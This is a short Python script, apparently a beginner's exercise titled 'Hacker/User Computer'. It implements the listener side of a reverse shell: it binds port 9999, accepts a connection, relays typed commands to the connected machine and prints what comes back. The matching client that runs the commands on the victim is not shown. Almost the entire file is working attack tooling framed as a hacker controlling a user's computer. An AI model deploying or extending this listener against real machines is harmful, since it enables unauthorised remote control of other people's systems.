# Hacker/User Computer

# Two Computer Can Connect To Each other
import socket
# Terminal Command in Python
import sys

host = ""
port = 9999

# Create a Socket (connect to computers)
def createSocket():
    try:
        global s
        s = socket.socket()  # Creating a Socket
    except socket.error as msg:
        print("Socket Creation Error: " + str(msg))

# Binding the Socket and Listening for Connections
def bindSocket():
    try:
        print("Binding Port: " + str(port))

        s.bind((host, port)) # Tuple in Python
        s.listen(5) # Atmost 5 connections

    except socket.error as msg:
        print("Socket Binding Error: " + str(msg) + "\n" + "Retrying...")
        bindSocket() # Recursively Calling Again

# Accepting Connection With Client (Sockets Must Be Listening)
def acceptSocket():
    connection, address = s.accept()
    print("Connection Established With: IP " + address[0] + ", Port: " + str(address[1]))

    sendCommand(connection) # For Commands To Send to Client

    connection.close()

# Send Commands to the Client
def sendCommand(connection):
    while True:
        cmd = input()
        if cmd == "quit":
            connection.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            connection.send(str.encode(cmd))
            clientResponse = str(connection.recv(1024), "utf-8")
            print(clientResponse, end="")

def main():
    createSocket()
    bindSocket()
    acceptSocket()

main()